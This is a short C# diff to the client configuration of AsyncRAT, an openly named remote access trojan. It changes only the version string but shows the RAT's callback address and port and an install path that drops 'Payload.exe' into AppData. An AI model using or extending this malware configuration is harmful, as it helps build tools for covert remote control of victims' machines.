@@ -18,7 +18,7 @@ namespace Client
     {
         public static readonly string IP = "127.0.0.1";
         public static readonly string Port = "6606";
-        public static readonly string Version = "AsyncRAT 0.2.7";
+        public static readonly string Version = "AsyncRAT 0.2.7A";
         public static readonly string Install = "false";
         public static readonly string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Payload.exe");
     }
